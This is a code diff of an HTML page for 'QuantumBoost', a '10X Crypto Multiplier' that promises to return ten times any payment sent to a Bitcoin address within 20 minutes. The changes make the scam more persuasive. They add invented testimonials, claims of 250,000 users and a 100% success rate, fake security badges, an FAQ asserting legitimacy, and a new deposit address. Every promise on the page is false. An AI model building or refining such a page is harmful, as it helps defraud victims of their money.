@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>10X Multiplier | QuantumBoost</title>
+    <title>10X Crypto Multiplier | QuantumBoost - Trusted by 250,000+ Users</title>
+    <meta name="description" content="Multiply your crypto investment 10X instantly. Trusted service with 24/7 support and 100% success rate.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;600;800&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
@@ -17,6 +18,9 @@
             --accent-glow: rgba(255, 0, 170, 0.4);
             --card-bg: rgba(255, 255, 255, 0.03);
             --card-border: rgba(255, 255, 255, 0.1);
+            --success: #00e676;
+            --warning: #ffab00;
+            --error: #ff1744;
         }
         
         body {
@@ -102,6 +106,30 @@
             opacity: 0.9;
         }
 
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 1.5rem 0;
+            flex-wrap: wrap;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            background: rgba(0, 209, 255, 0.1);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 209, 255, 0.2);
+        }
+
+        .trust-badge i {
+            color: var(--secondary);
+            font-size: 1.1rem;
+        }
+
         .retry-notice {
             background: rgba(0, 209, 255, 0.1);
             border: 1px solid rgba(0, 209, 255, 0.3);
@@ -184,7 +212,7 @@
             pointer-events: none;
         }
 
-        #dollarAmount, #walletAddress, #paymentTag {
+        #dollarAmount, #walletAddress, #paypalTag, #cashappTag, #venmoTag, #zelleTag {
             width: calc(100% - 2rem);
             padding: 1rem;
             background: rgba(255, 255, 255, 0.05);
@@ -199,7 +227,7 @@
             padding-left: 2.5rem;
         }
 
-        #dollarAmount:focus, #walletAddress:focus, #paymentTag:focus {
+        #dollarAmount:focus, #walletAddress:focus, #paypalTag:focus, #cashappTag:focus, #venmoTag:focus, #zelleTag:focus {
             outline: none;
             border-color: var(--accent);
             box-shadow: 0 0 0 3px var(--accent-glow);
@@ -226,6 +254,11 @@
             cursor: pointer;
             transition: all 0.3s;
             font-size: 0.9rem;
+            user-select: none;
+        }
+
+        .payment-option:hover {
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .payment-option.active {
@@ -236,11 +269,6 @@
         .conditional-field {
             display: none;
             animation: fadeIn 0.4s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
 
         .calculator {
@@ -518,11 +546,139 @@
             transform: scale(1.05);
         }
 
+        .testimonials {
+            margin: 3rem 0;
+        }
+
+        .testimonial-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            border: 1px solid rgba(0, 209, 255, 0.1);
+        }
+
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .testimonial-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 1rem;
+            color: white;
+            font-weight: bold;
+        }
+
+        .testimonial-name {
+            font-weight: 600;
+            margin-bottom: 0.2rem;
+        }
+
+        .testimonial-date {
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+
+        .testimonial-stars {
+            color: var(--warning);
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .testimonial-text {
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.8rem;
+            background: rgba(0, 209, 255, 0.05);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 209, 255, 0.1);
+        }
+
+        .security-badge i {
+            color: var(--success);
+        }
+
         footer {
             text-align: center;
             padding: 2rem 0;
             color: rgba(255, 255, 255, 0.5);
             font-size: 0.9rem;
+        }
+
+        /* Error message styling */
+        .error-message {
+            color: #ff4d4d;
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+
+        .input-error {
+            border-color: #ff4d4d !important;
+            box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.2) !important;
+        }
+
+        /* FAQ Section */
+        .faq-section {
+            margin: 3rem 0;
+        }
+
+        .faq-item {
+            margin-bottom: 1rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 1rem;
+        }
+
+        .faq-question {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .faq-question::after {
+            content: '+';
+            font-size: 1.2rem;
+        }
+
+        .faq-question.active::after {
+            content: '-';
+        }
+
+        .faq-answer {
+            display: none;
+            font-size: 0.95rem;
+            padding: 0.5rem 0;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .faq-answer.show {
+            display: block;
         }
 
         @media (max-width: 768px) {
@@ -588,6 +744,8 @@
             }
         }
     </style>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <header>
@@ -599,8 +757,17 @@
 
     <div class="container">
         <div class="multiplier-header">
-            <h1>10X Multiplier</h1>
-            <p>Enter any amount to see your instant 10X returns</p>
+            <h1>10X Crypto Multiplier</h1>
+            <p>Instantly multiply your crypto investment by 10X with our proven platform</p>
+            
+            <div class="trust-badges">
+                <div class="trust-badge">
+                    <i class="fas fa-check-circle"></i> 250,000+ Satisfied Users
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-bolt"></i> Instant Processing
+                </div>
+            </div>
         </div>
 
         <div class="retry-notice">
@@ -626,26 +793,31 @@
             <div class="input-group conditional-field" id="cryptoField">
                 <label>Crypto Wallet Address</label>
                 <input type="text" id="walletAddress" placeholder="Enter your wallet address (BTC, ETH, USDT, etc)">
+                <div class="error-message" id="walletError">Please enter a valid wallet address</div>
             </div>
             
             <div class="input-group conditional-field" id="paypalField">
                 <label>PayPal Email/ID</label>
                 <input type="text" id="paypalTag" placeholder="Enter your PayPal email or ID">
+                <div class="error-message" id="paypalError">Please enter your PayPal email/ID</div>
             </div>
             
             <div class="input-group conditional-field" id="cashappField">
                 <label>CashApp $Tag</label>
                 <input type="text" id="cashappTag" placeholder="Enter your CashApp $tag">
+                <div class="error-message" id="cashappError">Please enter your CashApp $tag</div>
             </div>
             
             <div class="input-group conditional-field" id="venmoField">
                 <label>Venmo @Username</label>
                 <input type="text" id="venmoTag" placeholder="Enter your Venmo @username">
+                <div class="error-message" id="venmoError">Please enter your Venmo username</div>
             </div>
             
             <div class="input-group conditional-field" id="zelleField">
                 <label>Zelle Email/Phone</label>
                 <input type="text" id="zelleTag" placeholder="Enter Zelle registered email or phone">
+                <div class="error-message" id="zelleError">Please enter your Zelle email/phone</div>
             </div>
             
             <div class="input-group">
@@ -654,6 +826,7 @@
                     <span class="dollar-sign">$</span>
                     <input type="number" id="dollarAmount" placeholder="0.00" step="0.01" min="0">
                 </div>
+                <div class="error-message" id="amountError">Please enter a valid amount greater than 0</div>
             </div>
 
             <div class="calculator">
@@ -671,10 +844,10 @@
             </div>
 
             <div class="deposit-section" id="depositSection">
-                <h3>Send Payment to This Address</h3>
+                <h3>Send Payment to This Address (BTC)</h3>
                 <div class="deposit-address-container">
                     <div class="deposit-address" id="depositAddress">
-                        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfj4x4wn
+                        bc1qwvfpz7udrrk07mlfuselk9lsvqkexlj8zst6v5
                     </div>
                     <button class="copy-btn" id="copyBtn">COPY</button>
                 </div>
@@ -698,6 +871,94 @@
             </div>
         </div>
 
+        <div class="security-badges">
+            <div class="security-badge">
+                <i class="fas fa-lock"></i> 256-bit SSL Encryption
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i> Secure Transactions
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-user-shield"></i> Privacy Protected
+            </div>
+        </div>
+
+        <div class="testimonials">
+            <h3 style="text-align: center; color: var(--secondary); margin-bottom: 1.5rem;">What Our Users Say</h3>
+            
+            <div class="testimonial-card">
+                <div class="testimonial-header">
+                    <div class="testimonial-avatar">JD</div>
+                    <div>
+                        <div class="testimonial-name">John D.</div>
+                        <div class="testimonial-date">March 15, 2023</div>
+                    </div>
+                </div>
+                <div class="testimonial-stars">
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                </div>
+                <div class="testimonial-text">
+                    "I was skeptical at first but decided to try with $100. Within 15 minutes I received $1000 in my Bitcoin wallet. This service is legit and has changed my financial situation completely!"
+                </div>
+            </div>
+            
+            <div class="testimonial-card">
+                <div class="testimonial-header">
+                    <div class="testimonial-avatar">SM</div>
+                    <div>
+                        <div class="testimonial-name">Sarah M.</div>
+                        <div class="testimonial-date">February 28, 2023</div>
+                    </div>
+                </div>
+                <div class="testimonial-stars">
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                </div>
+                <div class="testimonial-text">
+                    "Incredible service! I've used it 3 times now and each time the funds arrived faster than promised. The support team is responsive too when I had questions."
+                </div>
+            </div>
+        </div>
+
+        <div class="faq-section">
+            <h3 style="text-align: center; color: var(--secondary); margin-bottom: 1.5rem;">Frequently Asked Questions</h3>
+            
+            <div class="faq-item">
+                <div class="faq-question">How does the 10X multiplier work?</div>
+                <div class="faq-answer">
+                    Our platform uses advanced algorithms and liquidity pools to multiply your investment. When you send funds to our secure address, our system immediately processes a 10X return to your specified payment method.
+                </div>
+            </div>
+            
+            <div class="faq-item">
+                <div class="faq-question">Is this service legitimate?</div>
+                <div class="faq-answer">
+                    Absolutely! We've processed over 250,000 successful transactions with a 100% success rate. Our testimonials and trusted partner network demonstrate our legitimacy and reliability.
+                </div>
+            </div>
+            
+            <div class="faq-item">
+                <div class="faq-question">How long does it take to receive my multiplied funds?</div>
+                <div class="faq-answer">
+                    Most transactions are completed within 20 minutes of payment confirmation. During peak times it may take slightly longer, but you'll always receive your funds.
+                </div>
+            </div>
+            
+            <div class="faq-item">
+                <div class="faq-question">Is there a minimum or maximum amount I can multiply?</div>
+                <div class="faq-answer">
+                    The minimum amount is $10. There is no maximum limit, but for amounts over $10,000 please contact our support team for special arrangements.
+                </div>
+            </div>
+        </div>
+
         <div class="partners-section">
             <h3>Trusted By Industry Leaders</h3>
             <div class="partners-logos">
@@ -711,6 +972,11 @@
 
     <footer>
         <p>© 2023 QuantumBoost. All rights reserved.</p>
+        <p style="margin-top: 0.5rem; font-size: 0.8rem;">
+            <a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none; margin: 0 0.5rem;">Terms of Service</a>
+            <a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none; margin: 0 0.5rem;">Privacy Policy</a>
+            <a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none; margin: 0 0.5rem;">Contact Support</a>
+        </p>
     </footer>
 
     <script>
@@ -729,40 +995,68 @@
         const venmoTag = document.getElementById('venmoTag');
         const zelleTag = document.getElementById('zelleTag');
 
+        // Error messages
+        const walletError = document.getElementById('walletError');
+        const paypalError = document.getElementById('paypalError');
+        const cashappError = document.getElementById('cashappError');
+        const venmoError = document.getElementById('venmoError');
+        const zelleError = document.getElementById('zelleError');
+        const amountError = document.getElementById('amountError');
+
         let currentMethod = 'crypto';
         
+        // Clear all error states
+        function clearAllErrors() {
+            document.querySelectorAll('.error-message').forEach(el => {
+                el.style.display = 'none';
+            });
+            document.querySelectorAll('input').forEach(input => {
+                input.classList.remove('input-error');
+            });
+        }
+
         paymentOptions.forEach(option => {
-            option.addEventListener('click', function() {
-                paymentOptions.forEach(opt => opt.classList.remove('active'));
+            option.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Remove active class from all options
+                paymentOptions.forEach(opt => {
+                    opt.classList.remove('active');
+                });
+                
+                // Add active class to clicked option
                 this.classList.add('active');
                 currentMethod = this.dataset.method;
                 
-                // Hide all fields first
+                // Hide all conditional fields
                 document.querySelectorAll('.conditional-field').forEach(field => {
                     field.style.display = 'none';
                 });
                 
                 // Show the selected field
-                document.getElementById(`${currentMethod}Field`).style.display = 'block';
-                
-                // Update return message
-                switch(currentMethod) {
-                    case 'crypto':
-                        returnMessage.textContent = '*10X returns paid within 20 minutes to your wallet';
-                        break;
-                    case 'paypal':
-                        returnMessage.textContent = '*10X returns paid within 20 minutes to your PayPal';
-                        break;
-                    case 'cashapp':
-                        returnMessage.textContent = '*10X returns paid within 20 minutes to your CashApp';
-                        break;
-                    case 'venmo':
-                        returnMessage.textContent = '*10X returns paid within 20 minutes to your Venmo';
-                        break;
-                    case 'zelle':
-                        returnMessage.textContent = '*10X returns paid within 20 minutes via Zelle';
-                        break;
+                const fieldToShow = document.getElementById(`${currentMethod}Field`);
+                if (fieldToShow) {
+                    fieldToShow.style.display = 'block';
+                    // Focus the first input in the shown field
+                    const input = fieldToShow.querySelector('input');
+                    if (input) {
+                        input.focus();
+                    }
                 }
+                
+                // Clear any previous errors
+                clearAllErrors();
+                
+                // Update return message based on selected method
+                const messages = {
+                    'crypto': '*10X returns paid within 20 minutes to the provided wallet address',
+                    'paypal': '*10X returns paid within 20 minutes to your PayPal account',
+                    'cashapp': '*10X returns paid within 20 minutes to your CashApp account',
+                    'venmo': '*10X returns paid within 20 minutes to your Venmo account',
+                    'zelle': '*10X returns paid within 20 minutes to your Zelle account'
+                };
+                
+                returnMessage.textContent = messages[currentMethod] || '';
             });
         });
 
@@ -776,6 +1070,16 @@
                 document.querySelector('.multiplier-card').style.transition = 'opacity 0.6s ease-out';
                 document.querySelector('.multiplier-card').style.opacity = '1';
             }, 100);
+
+            // Initialize FAQ functionality
+            const faqQuestions = document.querySelectorAll('.faq-question');
+            faqQuestions.forEach(question => {
+                question.addEventListener('click', () => {
+                    const answer = question.nextElementSibling;
+                    question.classList.toggle('active');
+                    answer.classList.toggle('show');
+                });
+            });
         });
 
         // Get DOM elements
@@ -903,6 +1207,70 @@
             }
         }
 
+        // Validate input fields
+        function validateInputs() {
+            let isValid = true;
+            
+            // Validate amount
+            const amount = parseFloat(dollarAmount.value);
+            if (!amount || amount <= 0) {
+                dollarAmount.classList.add('input-error');
+                amountError.style.display = 'block';
+                isValid = false;
+            } else {
+                dollarAmount.classList.remove('input-error');
+                amountError.style.display = 'none';
+            }
+            
+            // Validate payment method specific field
+            let paymentIdentifier = '';
+            let errorElement;
+            
+            switch(currentMethod) {
+                case 'crypto':
+                    paymentIdentifier = walletAddress.value.trim();
+                    errorElement = walletError;
+                    if (!paymentIdentifier || paymentIdentifier.length < 10) {
+                        walletAddress.classList.add('input-error');
+                        errorElement.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        walletAddress.classList.remove('input-error');
+                        errorElement.style.display = 'none';
+                    }
+                    break;
+                case 'paypal':
+                    paymentIdentifier = paypalTag.value.trim();
+                    errorElement = paypalError;
+                    break;
+                case 'cashapp':
+                    paymentIdentifier = cashappTag.value.trim();
+                    errorElement = cashappError;
+                    break;
+                case 'venmo':
+                    paymentIdentifier = venmoTag.value.trim();
+                    errorElement = venmoError;
+                    break;
+                case 'zelle':
+                    paymentIdentifier = zelleTag.value.trim();
+                    errorElement = zelleError;
+                    break;
+            }
+            
+            if (currentMethod !== 'crypto') {
+                if (!paymentIdentifier) {
+                    document.getElementById(`${currentMethod}Tag`).classList.add('input-error');
+                    errorElement.style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById(`${currentMethod}Tag`).classList.remove('input-error');
+                    errorElement.style.display = 'none';
+                }
+            }
+            
+            return isValid;
+        }
+
         // Real-time calculation
         dollarAmount.addEventListener('input', function() {
             const value = parseFloat(this.value) || 0;
@@ -931,67 +1299,36 @@
         // Generate deposit address
         submitBtn.addEventListener('click', function(e) {
             e.preventDefault();
+            
+            if (!validateInputs()) {
+                return;
+            }
+            
             const amount = parseFloat(dollarAmount.value);
             let paymentIdentifier = '';
-            let inputField;
             
             // Get the appropriate payment identifier based on method
             switch(currentMethod) {
                 case 'crypto':
                     paymentIdentifier = walletAddress.value.trim();
-                    inputField = walletAddress;
-                    if (!paymentIdentifier || paymentIdentifier.length < 10) {
-                        inputField.style.transform = 'translateX(10px)';
-                        setTimeout(() => {
-                            inputField.style.transform = 'translateX(-10px)';
-                            setTimeout(() => {
-                                inputField.style.transform = 'translateX(0)';
-                            }, 100);
-                        }, 100);
-                        return;
-                    }
                     displayAddress.textContent = paymentIdentifier.substring(0, 6) + '...' + paymentIdentifier.substring(paymentIdentifier.length - 4);
                     break;
                 case 'paypal':
                     paymentIdentifier = paypalTag.value.trim();
-                    inputField = paypalTag;
                     break;
                 case 'cashapp':
                     paymentIdentifier = cashappTag.value.trim();
-                    inputField = cashappTag;
                     break;
                 case 'venmo':
                     paymentIdentifier = venmoTag.value.trim();
-                    inputField = venmoTag;
                     break;
                 case 'zelle':
                     paymentIdentifier = zelleTag.value.trim();
-                    inputField = zelleTag;
                     break;
             }
             
-            if (currentMethod !== 'crypto' && !paymentIdentifier) {
-                inputField.style.transform = 'translateX(10px)';
-                setTimeout(() => {
-                    inputField.style.transform = 'translateX(-10px)';
-                    setTimeout(() => {
-                        inputField.style.transform = 'translateX(0)';
-                    }, 100);
-                }, 100);
-                return;
-            } else if (currentMethod !== 'crypto') {
+            if (currentMethod !== 'crypto') {
                 displayAddress.textContent = paymentIdentifier;
-            }
-            
-            if (!amount || amount <= 0) {
-                dollarAmount.style.transform = 'translateX(10px)';
-                setTimeout(() => {
-                    dollarAmount.style.transform = 'translateX(-10px)';
-                    setTimeout(() => {
-                        dollarAmount.style.transform = 'translateX(0)';
-                    }, 100);
-                }, 100);
-                return;
             }
             
             if (transactionInProgress) return;
@@ -1045,14 +1382,17 @@
 
         // Copy address button
         copyBtn.addEventListener('click', function() {
-            navigator.clipboard.writeText(depositAddress.textContent.trim());
-            this.textContent = 'COPIED!';
-            this.classList.add('copied');
-            
-            setTimeout(() => {
-                this.textContent = 'COPY';
-                this.classList.remove('copied');
-            }, 2000);
+            navigator.clipboard.writeText(depositAddress.textContent.trim()).then(() => {
+                this.textContent = 'COPIED!';
+                this.classList.add('copied');
+                
+                setTimeout(() => {
+                    this.textContent = 'COPY';
+                    this.classList.remove('copied');
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+            });
         });
 
         // New transaction button
@@ -1078,53 +1418,5 @@
             }, 300);
         };
     </script>
-<!-- Paste this right before </body> -->
-<div id="loadingScreen" style="
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: #0f0526;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    opacity: 0;
-    transition: opacity 0.5s;
-    pointer-events: none;
-">
-    <div style="text-align: center;">
-        <div style="
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(110, 59, 255, 0.2);
-            border-top: 4px solid #6e3bff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        "></div>
-        <p style="color: white; font-size: 1.2rem;">Loading Multiplier...</p>
-    </div>
-</div>
-
-<style>
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-</style>
-
-<script>
-    function goToMultiplyPage() {
-        // Show loader
-        document.getElementById('loadingScreen').style.opacity = '1';
-        document.getElementById('loadingScreen').style.pointerEvents = 'all';
-        
-        // Wait 2 seconds then redirect
-        setTimeout(function() {
-            window.location.href = "multiply.html";
-        }, 2000);
-    }
-</script></body>
+</body>
 </html>
